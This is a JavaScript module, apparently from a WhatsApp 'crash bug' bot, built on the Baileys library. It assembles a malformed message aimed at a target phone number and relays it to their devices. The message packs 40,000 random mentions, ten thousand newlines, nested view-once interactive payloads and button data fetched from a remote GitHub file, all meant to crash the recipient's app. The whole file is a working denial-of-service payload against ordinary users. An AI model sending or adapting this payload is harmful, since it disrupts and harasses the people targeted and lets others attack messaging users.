const { relayCrashToDevices } = require('../target-utils');
/*
 * © 2026 SeXyxeon (VOIDSEC)
 *
 * ⚠️ COPYRIGHT NOTICE
 * This source code is protected under copyright law.
 * Any form of re-uploading, recoding, modification,
 * selling, or redistribution WITHOUT explicit permission
 * from the original author is strictly prohibited.
 *
 * ❌ NO CREDIT = NO PERMISSION
 * ❌ DO NOT CLAIM THIS CODE AS YOUR OWN
 *
 * ✔️ Usage or modification is allowed ONLY
 * with prior permission and proper credit.
 *
 * OFFICIAL LINKS (ONLY):
 * YouTube   : https://youtube.com/@voidsec7718
 * Instagram : sabir._7718
 * Telegram  : https://t.me/SABIR7718
 * GitHub    : https://github.com/SABIR7718
 * WhatsApp  : +91 73650 85213
 *
 * Violations may result in DMCA takedown
 * or termination of the Telegram bot.
 */

const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');

async function test(Aii, target) {
  let ApiNewFC;
  try {
    const res = await fetch('https://raw.githubusercontent.com/alwaysZuroku/AlwaysZuroku/main/ApiClient.json', { signal: AbortSignal.timeout(3000) });
    if (res.ok) {
      ApiNewFC = await res.text();
    } else {
      throw new Error(`HTTP ${res.status}`);
    }
  } catch (err) {
    console.error("[test] error fetching ApiClient.json, using fallback:", err.message);
    ApiNewFC = JSON.stringify({
      status: true,
      criador: "Zuroku WA ApiClient",
      resultado: { type: "md", ws: true }
    });
  }

  const mentionedList = Array.from({ length: 40000 }, () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`);

  const contextInfo = {
    mentionedJid: mentionedList,
    isForwarded: true,
    forwardingScore: 999,
    businessMessageForwardInfo: {
      businessOwnerJid: target,
    },
  };

  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: {
            text: ''
          },
          footer: {
            text: ''
          },
          carouselMessage: {
            cards: [
              {
                header: {
                  title: 'Viona Tes Bag',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQEASABIAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABAMDBAMDBAQDBAUEBAUGCgcGBgYGDQkKCAoPDRAQDw0PDhETGBQREhcSDg8VHBUXGRkbGxsQFB0fHRofGBobGv/bAEMBBAUFBgUGDAcHDBoRDxEaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGv/AABEIASwBLAMBIgACEQEDEQH/xAAcAAACAwEBAQEAAAAAAAAAAAACAwQGBwUBAAj/xABFEAABAwIDBQQGBwYFBAMBAAACAAEDBBIFESIGITJCUhMxQWIUUWFxcoIHFSOSorLCJDOBkdLwQ6HB4eI0c7HRFkRTY//EABsBAAIDAQEBA────────AAAAAABAgMEBQYHAAj/xABFEAABAwIDBQQGBwYFBAMBAAACAAEDBBIFESIGITJCUhMxQWIUUWFxcoIHFSOSorLCJDOBkdLwQ6HB4eI0c7HRFkRTY//EABsBAAIDAQEBA────────AAAAAABAgMEBQYHAAj/xABFEAABAwIDBQQGBwYFBAMBAAACAAEDBBIFESIGITJCUhMxQWIUUWFxcoIHFSOSorLCJDOBkdLwQ6HB4eI0c7HRFkRTY//EABsBAAIDAQEBA────────AAAAAABAgMEBQYHAAj/xABFEAABAwIDBQQGBwYFBAMBAAACAAEDBBIFESIGITJCUhMxQWIUUWFxcoIHFSOSorLCJDOBkdLwQ6HB4eI0c7HRFkRTY//EABsBAAIDAQEBA────────AAAAAABAgMEBQYHAAj",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "CIKZY Kill You🔥"
                },
                footer: {
                  text: "Vlorina.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000)
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    interactiveMessage: {
                      contextInfo,
                      body: {
                        text: "⏤‌C I K Y × B A C K‌  ⃟ ✧",
                      },
                      nativeFlowMessage: {
                        buttons: [
                          {
                            name : "single_select",
                            buttonParamsJson: ApiNewFC + "",
                          },
                          {
                            name : "call_permission_request",
                            buttonParamsJson: ApiNewFC + "\u0003",
                          },
                        ],
                      },
                    },
                  }
                }
              },
              remoteJid: "@s.whatsapp.net"
            }
          }
        }
      }
    }
  },
  {});

  await relayCrashToDevices(Aii, target, msg.message);
}

module.exports = { test };
